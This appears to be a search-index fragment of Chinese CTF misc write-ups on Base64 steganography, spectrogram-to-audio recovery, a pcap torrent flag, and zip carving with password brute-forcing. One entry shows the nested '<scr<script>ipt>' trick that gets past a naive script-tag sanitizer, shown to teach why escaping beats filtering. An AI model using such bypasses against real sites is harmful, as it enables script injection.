\u662f\u7531\u4e0e\u539f\u6587\u6709\u5dee\u5f02\u7684\u5b57\u7b26\u7ec4\u6210\u7684\u4e48\uff1f\u3010\u53ef\u80fd\u6027\u4e0d\u5927\u2026 1 2 3 4 5 6 7 8 # \u89e3\u7801\u6587\u672c\u8282\u9009 ... \u00e2\u0080\u009cMy dear Mr. Zennet,\u00e2\u0080\u009d said his lady to him one day, \u00e2\u0080\u009chave you hearg that Netherfield \\a rk is let at last?\u00e2\u0080\u009d Mr. Bennet replied that he had not. \u00e2\u0080\u009cBut it is,\u00e2\u0080\u009d returned she ; \u00e2\u0080\u009cfor Mrs. Long has just been here, and she told me all about it.\u00e2\u0080\u009d ... \u5176\u5b9e\u662f Base64 \u9690\u5199 XD \u63d0\u53d6\u7684\u5185\u5bb9\u4e3a\uff1a flag{md5(0)} \u8ba1\u7b97 0 \u7684 MD5 \u54c8\u5e0c\u503c\u5373\u53ef\u83b7\u5f97 Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/newsctf_all_reverse/#base64","text":"Base64 \u7f16\u7801\u5373\u5c06\u6587\u672c\u5b57\u7b26\u5bf9\u5e94\u6210\u4e8c\u8fdb\u5236\u540e\uff0c\u518d\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u7ec4\u8f6c\u6362\u4e3a\u53ef\u6253\u5370\u5b57\u7b26\u3002\u82e5\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u662f 3 \u7684\u500d\u6570\uff0c\u5219\u5148\u4f7f\u7528 0 \u5b57\u8282\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u518d\u8fdb\u884c\u7f16\u7801\uff0c\u5e76\u5728\u7f16\u7801\u7684\u6587\u672c\u540e\u6dfb\u52a0\u4e00\u4e2a\uff08\u5f85\u7f16\u7801\u5b57\u8282\u6570\u6a21 3 \u4f59 2\uff09\u6216\u4e24\u4e2a\uff08\u5f85\u7f16\u7801\u5b57\u8282\u6570\u6a21 3 \u4f59 1\uff09\u7b49\u53f7 .tg {border-collapse:collapse;border-spacing:0;} .tg td th{border-color:black;border-style:solid;border-width:1px;font-family:Arial, sans-serif;font-size:14px;font-weight:normal; overflow:hidden;padding:10px 5px;word-break:normal;} .tg .tg-lboi{border-color:inherit;text-align:left;vertical-align:middle} .tg .tg-kaq8{border-color:inherit;color:#fe0000;font-weight:bold;text-align:left;} .tg .tg-uzvj{border-color:inherit;font-weight:bold;text-align:center;} .tg .tg-fymr{border-color:inherit;font-weight:bold;text-align:left;} \u6587\u672c\uff081 Byte\uff09 A \u4e8c\u8fdb\u5236\u4f4d 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \u4e8c\u8fdb\u5236\u4f4d\uff08\u88650\uff09 0 1 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 Base64\u7f16\u7801 Q Q = = \u6587\u672c\uff082 Byte\uff09 B C \u4e8c\u8fdb\u5236\u4f4d 0 1 0 0 0 0 1 0 0 1 0 0 0 0 1 1 0 0 0 0 0 0 0 0 \u4e8c\u8fdb\u5236\u4f4d\uff08\u88650\uff09 0 1 0 0 0 0 1 0 0 1 0 0 0 0 1 1 0 0 0 0 0 0 0 0 Base64\u7f16\u7801 Q k M = Base64 \u89e3\u7801\u5219\u9996\u5148\u4e22\u5f03\u586b\u5145\u7684\u7b49\u53f7\uff0c\u800c\u540e\u5c06\u7f16\u7801\u5b57\u7b26\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u6bcf 8 \u4e2a\u4e00\u7ec4\u8f6c\u5316\u4e3a ASCII \u7801\uff0c\u76f4\u5230\u5269\u4f59\u7684\u4e8c\u8fdb\u5236\u6570\u4e0d\u8db3 8 \u4f4d\u3002\u4e0a\u8868\u6807 \u7ea2 \u7684\u4e8c\u8fdb\u5236\u4f4d\u4e0d\u4f1a\u5f71\u54cd\u89e3\u7801\uff0c\u53ef\u7528\u4e8e\u9690\u5199 extract.py 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/env python3 path = './stego.txt' b64char = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open ( path , 'r' ) as f : cipher = [ i . strip () for i in f . readlines ()] bstr = '' for l in cipher : if l [ - 2 :] == '==' : bstr += bin ( b64char . index ( l [ - 3 ]))[ 2 :] . zfill ( 8 )[ - 4 :] elif l [ - 1 :] == '=' : bstr += bin ( b64char . index ( l [ - 2 ]))[ 2 :] . zfill ( 8 )[ - 2 :] print ( '' . join ([ chr ( int ( bstr [ i : i + 8 ], 2 )) for i in range ( 0 , len ( bstr ), 8 )]))","title":"Base64 \u9690\u5199"},{"location":"misc/p_q/","text":"\u9898\u76ee \u00b6 \u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 generate_sound_visualization.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python3 from array2gif import write_gif # version: 1.0.4 import librosa # version: 0.8.1 import numpy # version: 1.19.5 num_freqs = 32 quantize = 2 min_db = - 60 max_db = 30 fft_window_size = 2048 frame_step_size = 512 window_function_type = 'hann' red_pixel = [ 255 , 0 , 0 ] white_pixel = [ 255 , 255 , 255 ] y , sample_rate = librosa . load ( \"flag.mp3\" ) # sample rate is 22050 Hz spectrogram = ( numpy . around ( librosa . power_to_db ( librosa . feature . melspectrogram ( y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type )) / quantize ) * quantize ) gif_data = [ numpy . kron ( numpy . array ([[ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ]] for freq in range ( num_freqs * 2 + 1 )]), numpy . ones ([ quantize , quantize , 1 ])) for frame in spectrogram . transpose ()] write_gif ( gif_data , 'flag.gif' , fps = sample_rate / frame_step_size ) \u89e3\u9898\u601d\u8def \u00b6 \u9996\u5148\u9700\u8981\u83b7\u53d6 GIF \u4e2d\u7684\u6570\u636e\u3002\u770b\u5230 write_gif() \u51fd\u6570\u731c\u60f3\u5e94\u8be5\u6709\u9006\u51fd\u6570\uff0c\u4e8e\u662f\u627e\u5230\u4e86 bunkahle/gif2numpy \u3002\u53ef\u60dc\u4f7f\u7528\u5176\u4ed6\u97f3\u9891\u751f\u6210\u7684 GIF \u8fdb\u884c\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u8bfb\u53d6\u7684\u6570\u636e\u6709\u635f\u5931\uff0c\u6700\u540e\u8fd8\u662f\u4f7f\u7528\u4e86 PIL 1 2 3 4 from PIL import Image , ImageSequence img = Image . open ( 'flag.gif' ) np_frames = numpy . array ([ numpy . array ( frame . copy () . convert ( 'RGB' ) . getdata (), dtype = numpy . uint8 ) . reshape ( frame . size [ 1 ], frame . size [ 0 ], 3 ) for frame in ImageSequence . Iterator ( img )]) power_to_db \u548c melspectrogram \u5206\u522b\u6709\u9006\u51fd\u6570 db_to_power \u548c mel_to_audio \uff0c\u53ea\u8981\u83b7\u5f97 spectrogram \uff08\u65f6\u9891\u8c31\uff09 \u5c31\u53ef\u4ee5\u4e86 \u65f6\u9891\u8c31\u56fe\uff08\u8bed\u8c31\u56fe\uff09\uff0c\u6a2a\u8f74\u4e3a\u65f6\u95f4\uff0c\u7eb5\u8f74\u4e3a\u9891\u7387\uff0c\u989c\u8272\u8868\u793a\u5e45\u503c \u5206\u6790 gif_data \u7684\u751f\u6210\u8fc7\u7a0b\uff08\u76f4\u63a5\u4f7f\u7528\u5176\u4ed6\u97f3\u9891\u5bf9\u6bd4 spectrogram \u548c gif_data \u66f4\u76f4\u89c2\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ numpy . kron ( numpy . array ( [ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ] ), numpy . ones ([ quantize , quantize , 1 ]) ) for frame in spectrogram . transpose () # \u77e9\u9635\u8f6c\u7f6e\uff0c\u65f6\u57df -> \u9891\u57df ] gif_data \u4e3a\u56db\u7ef4\u6570\u7ec4 \u7b2c\u4e00\u7ef4\u4e3a\u5e27\uff0c\u4ee3\u8868\u65f6\u95f4 \u7b2c\u4e8c\u7ef4\u4e3a\u56fe\u50cf\u6a2a\u5411\u6570\u636e\uff0c\u5373\u4e0d\u540c\u9891\u7387 \u7b2c\u4e09\u7ef4\u4e3a\u56fe\u50cf\u7eb5\u5411\u6570\u636e\uff0c\u5373\u5404\u9891\u7387\u7684\u5f3a\u5ea6 \u7b2c\u56db\u7ef4\u662f\u50cf\u7d20\u70b9 RGB \u503c \u8f6c\u6362 GIF \u6570\u636e 1 2 3 4 5 6 7 8 9 10 11 spectrogram = numpy . zeros ([ 32 , len ( np_frames )], dtype = numpy . float32 ) for i in range ( len ( np_frames )): for h in range ( len ( np_frames [ i ])): for w in range ( 2 , len ( np_frames [ i ][ h ]), 2 ): if 0 in np_frames [ i ][ h ][ w ]: spectrogram [( w + 2 ) // 4 - 1 ][ i ] = max ( spectrogram [( w + 2 ) // 4 - 1 ][ i ], 92 - h ) # \u9ad8\u5728\u6570\u7ec4\u4e2d\u4e3a\u5012\u5e8f\u5b58\u50a8 for i in range ( len ( spectrogram )): for j in range ( len ( spectrogram [ i ])): spectrogram [ i ][ j ] -= 60 # \u8f6c\u5316\u5230 [-60, 30] \u751f\u6210\u97f3\u9891\u6587\u4ef6\uff0c\u6253\u5f00\u505a\u4e2a\u82f1\u8bed\u542c\u529b\u5c31\u53ef\u4ee5\u4e86 XD 1 2 3 4 import soundfile S = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), hop_length = frame_step_size , window = window_function_type ) soundfile . write ( 'flag.wav' , S , sample_rate ) \u53c2\u8003\u8d44\u6599 \u00b6 tanyaschlusser/array2gif","title":"p\ud83d\ude2dq"},{"location":"misc/p_q/#_1","text":"\u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 generate_sound_visualization.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python3 from array2gif import write_gif # version: 1.0.4 import librosa # version: 0.8.1 import numpy # version: 1.19.5 num_freqs = 32 quantize = 2 min_db = - 60 max_db = 30 fft_window_size = 2048 frame_step_size = 512 window_function_type = 'hann' red_pixel = [ 255 , 0 , 0 ] white_pixel = [ 255 , 255 , 255 ] y , sample_rate = librosa . load ( \"flag.mp3\" ) # sample rate is 22050 Hz spectrogram = ( numpy . around ( librosa . power_to_db ( librosa . feature . melspectrogram ( y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type )) / quantize ) * quantize ) gif_data = [ numpy . kron ( numpy . array ([[ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ]] for freq in range ( num_freqs * 2 + 1 )]), numpy . ones ([ quantize , quantize , 1 ])) for frame in spectrogram . transpose ()] write_gif ( gif_data , 'flag.gif' , fps = sample_rate / frame_step_size )","title":"\u9898\u76ee"},{"location":"misc/p_q/#_2","text":"\u9996\u5148\u9700\u8981\u83b7\u53d6 GIF \u4e2d\u7684\u6570\u636e\u3002\u770b\u5230 write_gif() \u51fd\u6570\u731c\u60f3\u5e94\u8be5\u6709\u9006\u51fd\u6570\uff0c\u4e8e\u662f\u627e\u5230\u4e86 bunkahle/gif2numpy \u3002\u53ef\u60dc\u4f7f\u7528\u5176\u4ed6\u97f3\u9891\u751f\u6210\u7684 GIF \u8fdb\u884c\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u8bfb\u53d6\u7684\u6570\u636e\u6709\u635f\u5931\uff0c\u6700\u540e\u8fd8\u662f\u4f7f\u7528\u4e86 PIL 1 2 3 4 from PIL import Image , ImageSequence img = Image . open ( 'flag.gif' ) np_frames = numpy . array ([ numpy . array ( frame . copy () . convert ( 'RGB' ) . getdata (), dtype = numpy . uint8 ) . reshape ( frame . size [ 1 ], frame . size [ 0 ], 3 ) for frame in ImageSequence . Iterator ( img )]) power_to_db \u548c melspectrogram \u5206\u522b\u6709\u9006\u51fd\u6570 db_to_power \u548c mel_to_audio \uff0c\u53ea\u8981\u83b7\u5f97 spectrogram \uff08\u65f6\u9891\u8c31\uff09 \u5c31\u53ef\u4ee5\u4e86 \u65f6\u9891\u8c31\u56fe\uff08\u8bed\u8c31\u56fe\uff09\uff0c\u6a2a\u8f74\u4e3a\u65f6\u95f4\uff0c\u7eb5\u8f74\u4e3a\u9891\u7387\uff0c\u989c\u8272\u8868\u793a\u5e45\u503c \u5206\u6790 gif_data \u7684\u751f\u6210\u8fc7\u7a0b\uff08\u76f4\u63a5\u4f7f\u7528\u5176\u4ed6\u97f3\u9891\u5bf9\u6bd4 spectrogram \u548c gif_data \u66f4\u76f4\u89c2\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 [ numpy . kron ( numpy . array ( [ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ] ), numpy . ones ([ quantize , quantize , 1 ]) ) for frame in spectrogram . transpose () # \u77e9\u9635\u8f6c\u7f6e\uff0c\u65f6\u57df -> \u9891\u57df ] gif_data \u4e3a\u56db\u7ef4\u6570\u7ec4 \u7b2c\u4e00\u7ef4\u4e3a\u5e27\uff0c\u4ee3\u8868\u65f6\u95f4 \u7b2c\u4e8c\u7ef4\u4e3a\u56fe\u50cf\u6a2a\u5411\u6570\u636e\uff0c\u5373\u4e0d\u540c\u9891\u7387 \u7b2c\u4e09\u7ef4\u4e3a\u56fe\u50cf\u7eb5\u5411\u6570\u636e\uff0c\u5373\u5404\u9891\u7387\u7684\u5f3a\u5ea6 \u7b2c\u56db\u7ef4\u662f\u50cf\u7d20\u70b9 RGB \u503c \u8f6c\u6362 GIF \u6570\u636e 1 2 3 4 5 6 7 8 9 10 11 spectrogram = numpy . zeros ([ 32 , len ( np_frames )], dtype = numpy . float32 ) for i in range ( len ( np_frames )): for h in range ( len ( np_frames [ i ])): for w in range ( 2 , len ( np_frames [ i ][ h ]), 2 ): if 0 in np_frames [ i ][ h ][ w ]: spectrogram [( w + 2 ) // 4 - 1 ][ i ] = max ( spectrogram [( w + 2 ) // 4 - 1 ][ i ], 92 - h ) # \u9ad8\u5728\u6570\u7ec4\u4e2d\u4e3a\u5012\u5e8f\u5b58\u50a8 for i in range ( len ( spectrogram )): for j in range ( len ( spectrogram [ i ])): spectrogram [ i ][ j ] -= 60 # \u8f6c\u5316\u5230 [-60, 30] \u751f\u6210\u97f3\u9891\u6587\u4ef6\uff0c\u6253\u5f00\u505a\u4e2a\u82f1\u8bed\u542c\u529b\u5c31\u53ef\u4ee5\u4e86 XD 1 2 3 4 import soundfile S = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), hop_length = frame_step_size , window = window_function_type ) soundfile . write ( 'flag.wav' , S , sample_rate )","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/p_q/#_3","text":"tanyaschlusser/array2gif","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/pirates/","text":"\u9898\u76ee \u00b6 Mr.Reed and his pirating ring has finally been caught by the police but unfortunately we dont have enough evidence to indict him. All we could get is a network capture of his private network.Can you find any evidence to be used against him ? \u89e3\u9898\u601d\u8def \u00b6 \u67e5\u770b network_listen.pcap \uff0c\u7b5b\u9009 HTTP \u6d41\uff0c\u6ce8\u610f\u5230\u4e0b\u8f7d\u4e86\u4e00\u4e2a\u79cd\u5b50\u6587\u4ef6 \u96be\u9053\u4fe1\u606f\u9690\u85cf\u5728 MP4 \u91cc\u4e48\uff1f\u4f7f\u7528 Wireshark \u5bfc\u51fa i_COULD_have_the_flag.mp4.torrent \uff0c\u5e76\u4e22\u5230 Deluge \u5c1d\u8bd5\u4e0b\u8f7d \u53d1\u73b0\u4e0b\u8f7d\u8fdf\u8fdf\u6ca1\u6709\u5f00\u59cb\uff0c\u7591\u60d1 (\u014f\u03c9\u014f) \u6ce8\u610f\u5230 Trackers \u6709\u62a5\u9519\uff0c\u770b\u770b\u62a5\u9519\u4fe1\u606f\uff1a \u9519\u8bef: unsupported URL protocol \uff0cURL \u6709\u95ee\u9898\uff1f \u7f16\u8f91Trackers \uff0c\u6253\u5f00\u5c31\u770b\u5230 Flag\uff01\u2299w\u2299","title":"Pirates"},{"location":"misc/pirates/#_1","text":"Mr.Reed and his pirating ring has finally been caught by the police but unfortunately we dont have enough evidence to indict him. All we could get is a network capture of his private network.Can you find any evidence to be used against him ?","title":"\u9898\u76ee"},{"location":"misc/pirates/#_2","text":"\u67e5\u770b network_listen.pcap \uff0c\u7b5b\u9009 HTTP \u6d41\uff0c\u6ce8\u610f\u5230\u4e0b\u8f7d\u4e86\u4e00\u4e2a\u79cd\u5b50\u6587\u4ef6 \u96be\u9053\u4fe1\u606f\u9690\u85cf\u5728 MP4 \u91cc\u4e48\uff1f\u4f7f\u7528 Wireshark \u5bfc\u51fa i_COULD_have_the_flag.mp4.torrent \uff0c\u5e76\u4e22\u5230 Deluge \u5c1d\u8bd5\u4e0b\u8f7d \u53d1\u73b0\u4e0b\u8f7d\u8fdf\u8fdf\u6ca1\u6709\u5f00\u59cb\uff0c\u7591\u60d1 (\u014f\u03c9\u014f) \u6ce8\u610f\u5230 Trackers \u6709\u62a5\u9519\uff0c\u770b\u770b\u62a5\u9519\u4fe1\u606f\uff1a \u9519\u8bef: unsupported URL protocol \uff0cURL \u6709\u95ee\u9898\uff1f \u7f16\u8f91Trackers \uff0c\u6253\u5f00\u5c31\u770b\u5230 Flag\uff01\u2299w\u2299","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/s_script_gi/","text":"\u9898\u76ee \u00b6 Can you figure out why s/<script>//gi is insufficient for sanitizing? This can be bypassed with <scr<script>ipt> . Remove <script> (case insensitive) from the input until the input contains no <script> . Note that flag format is SECCON{[\\x20-\\x7e]+} , which means that the flag may contains < or > as the following examples. Sample Input 1: S3CC0N{dum<scr<script>ipt>my} Sample Output 1: S3CC0N{dummy} Sample Input 2 (small.txt): S3CC0N{dumm<scrIpT>y_flag>_<_pt>>PT><<SCr<S<<SC<SCRIpT><scRiPT>Ript>sCr<Scri<... Sample Output 2: S3CC0N{dummy_flag>_<_pt>>PT><sCRIp<scr<scr<scr!pt>ipt>ipt>} \u89e3\u9898\u601d\u8def \u00b6 \u4e0d\u65ad\u79fb\u9664 <script> \uff08\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff09 \u6807\u7b7e\uff0c\u76f4\u5230\u6ca1\u6709\u4e3a\u6b62 \u7136\u800c flag.txt \u5927\u5c0f\u9ad8\u8fbe 67M \u5148\u7528 sed \u66ff\u6362\u51e0\u4e0b\uff0c\u80fd\u780d\u6389 20 M 1 for i in { 1 ..10 } ; do sed -i 's/<[sS][cC][rR][iI][pP][tT]>//g' flag.txt ; done \u7136\u540e\uff0c\u8fdb\u5165\u74f6\u9888\u9636\u6bb5 -_- \u300c\u7528\u5565\u90fd\u4e0d\u4f1a\u592a\u5feb\u300d\uff08Python \u548c C++ \u90fd\u8dd1\u4e86\u4e24\u5c0f\u65f6\u5de6\u53f3\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 s = open ( 'flag.bak' , 'r' ) . read () l = len ( s ) res , p = '' , 0 for i in range ( l ): if s [ i ] == '>' : res += s [ p : i + 1 ] while '<script>' == res [ - 8 :] . lower (): res = res [: - 8 ] p = i + 1 if p != l : res += s [ p : l ] print ( res ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include <iostream> #include <fstream> #include <algorithm> using namespace std ; int main () { ifstream infile ; infile . open ( \"flag.txt\" ); string s , r = \"\" ; infile >> s ; infile . close (); int l = s . length (), p = 0 ; for ( int i = 0 ; i < l ; i ++ ) { if ( s [ i ] == '>' ) { r += s . substr ( p , i - p + 1 ); int tl = r . length (); string tmp = r . substr ( tl - 8 ); transform ( tmp . begin (), tmp . end (), tmp . begin (), :: tolower ); if ( \"<script>\" == tmp ) { r = r . substr ( 0 , tl - 8 ); } p = i + 1 ; } } if ( p != l ) { r += s . substr ( p , l - p + 1 ); } cout << r << endl ; return 0 ; } \u6700\u7ec8\u7ed3\u679c\uff1a SECCON{sanitizing_is_not_so_good><_escaping_is_better_iPt><SCript<ScrIpT<scRIp<scRI<Sc<scr!pt>}","title":"s/&lt;script&gt;//gi"},{"location":"misc/s_script_gi/#_1","text":"Can you figure out why s/<script>//gi is insufficient for sanitizing? This can be bypassed with <scr<script>ipt> . Remove <script> (case insensitive) from the input until the input contains no <script> . Note that flag format is SECCON{[\\x20-\\x7e]+} , which means that the flag may contains < or > as the following examples. Sample Input 1: S3CC0N{dum<scr<script>ipt>my} Sample Output 1: S3CC0N{dummy} Sample Input 2 (small.txt): S3CC0N{dumm<scrIpT>y_flag>_<_pt>>PT><<SCr<S<<SC<SCRIpT><scRiPT>Ript>sCr<Scri<... Sample Output 2: S3CC0N{dummy_flag>_<_pt>>PT><sCRIp<scr<scr<scr!pt>ipt>ipt>}","title":"\u9898\u76ee"},{"location":"misc/s_script_gi/#_2","text":"\u4e0d\u65ad\u79fb\u9664 <script> \uff08\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff09 \u6807\u7b7e\uff0c\u76f4\u5230\u6ca1\u6709\u4e3a\u6b62 \u7136\u800c flag.txt \u5927\u5c0f\u9ad8\u8fbe 67M \u5148\u7528 sed \u66ff\u6362\u51e0\u4e0b\uff0c\u80fd\u780d\u6389 20 M 1 for i in { 1 ..10 } ; do sed -i 's/<[sS][cC][rR][iI][pP][tT]>//g' flag.txt ; done \u7136\u540e\uff0c\u8fdb\u5165\u74f6\u9888\u9636\u6bb5 -_- \u300c\u7528\u5565\u90fd\u4e0d\u4f1a\u592a\u5feb\u300d\uff08Python \u548c C++ \u90fd\u8dd1\u4e86\u4e24\u5c0f\u65f6\u5de6\u53f3\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 s = open ( 'flag.bak' , 'r' ) . read () l = len ( s ) res , p = '' , 0 for i in range ( l ): if s [ i ] == '>' : res += s [ p : i + 1 ] while '<script>' == res [ - 8 :] . lower (): res = res [: - 8 ] p = i + 1 if p != l : res += s [ p : l ] print ( res ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include <iostream> #include <fstream> #include <algorithm> using namespace std ; int main () { ifstream infile ; infile . open ( \"flag.txt\" ); string s , r = \"\" ; infile >> s ; infile . close (); int l = s . length (), p = 0 ; for ( int i = 0 ; i < l ; i ++ ) { if ( s [ i ] == '>' ) { r += s . substr ( p , i - p + 1 ); int tl = r . length (); string tmp = r . substr ( tl - 8 ); transform ( tmp . begin (), tmp . end (), tmp . begin (), :: tolower ); if ( \"<script>\" == tmp ) { r = r . substr ( 0 , tl - 8 ); } p = i + 1 ; } } if ( p != l ) { r += s . substr ( p , l - p + 1 ); } cout << r << endl ; return 0 ; } \u6700\u7ec8\u7ed3\u679c\uff1a SECCON{sanitizing_is_not_so_good><_escaping_is_better_iPt><SCript<ScrIpT<scRIp<scRI<Sc<scr!pt>}","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/secret_information/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u4f7f\u7528 binwalk \u67e5\u770b\uff0c\u53d1\u73b0\u5305\u542b\u538b\u7f29\u6587\u4ef6 1 2 3 4 5 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 24976 0x6190 Zip archive data, encrypted at least v2.0 to extract, compressed size: 453 , uncompressed size: 5038 , name: flag.txt 25557 0x63D5 End of Zip archive \u4f7f\u7528 dd if=misc03.jpg of=flag.zip skip=24976 bs=1 \u63d0\u53d6\u538b\u7f29\u5305\uff08\u76f4\u63a5\u4f7f\u7528 binwalk -e \u63d0\u53d6\u4f1a\u5bfc\u81f4\u538b\u7f29\u5305\u635f\u574f\uff09 \u89e3\u538b\u65f6\uff0c\u53d1\u73b0\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u4f7f\u7528\u5de5\u5177\u7206\u7834\u5f97\u5230\u5bc6\u7801\u4e3a 7878 flag.txt \u7684\u5185\u5bb9\u662f\u4e00\u4e2a 01 \u77e9\u9635\uff0c\u7ecf\u89c2\u5bdf\u53d1\u73b0\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u4f46\u4e0d\u80fd\u76f4\u63a5\u626b\u63cf\uff0c\u4f7f\u7528 Word \u8fdb\u884c\u66ff\u6362\uff0c\u5e76\u8c03\u6574\u884c\u8ddd\uff0c\u4f7f\u7528\u7684\u662f\u516b\u53f7\u5b57\u9ed1\u4f53\uff0c\u626b\u63cf\u4e8c\u7ef4\u7801\u5373\u53ef\u83b7\u5f97 flag","title":"\u673a\u5bc6\u4fe1\u606f"},{"location":"misc/secret_information/#_1","text":"\u4f7f\u7528 binwalk \u67e5\u770b\uff0c\u53d1\u73b0\u5305\u542b\u538b\u7f29\u6587\u4ef6 1 2 3 4 5 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1 .01 24976 0x6190 Zip archive data, encrypted at least v2.0 to extract, compressed size: 453 , uncompressed size: 5038 , name: flag.txt 25557 0x63D5 End of Zip archive \u4f7f\u7528 dd if=misc03.jpg of=flag.zip skip=24976 bs=1 \u63d0\u53d6\u538b\u7f29\u5305\uff08\u76f4\u63a5\u4f7f\u7528 binwalk -e \u63d0\u53d6\u4f1a\u5bfc\u81f4\u538b\u7f29\u5305\u635f\u574f\uff09 \u89e3\u538b\u65f6\uff0c\u53d1\u73b0\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff0c\u4f7f\u7528\u5de5\u5177\u7206\u7834\u5f97\u5230\u5bc6\u7801\u4e3a 7878 flag.txt \u7684\u5185\u5bb9\u662f\u4e00\u4e2a 01 \u77e9\u9635\uff0c\u7ecf\u89c2\u5bdf\u53d1\u73b0\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801\uff0c\u4f46\u4e0d\u80fd\u76f4\u63a5\u626b\u63cf\uff0c\u4f7f\u7528 Word 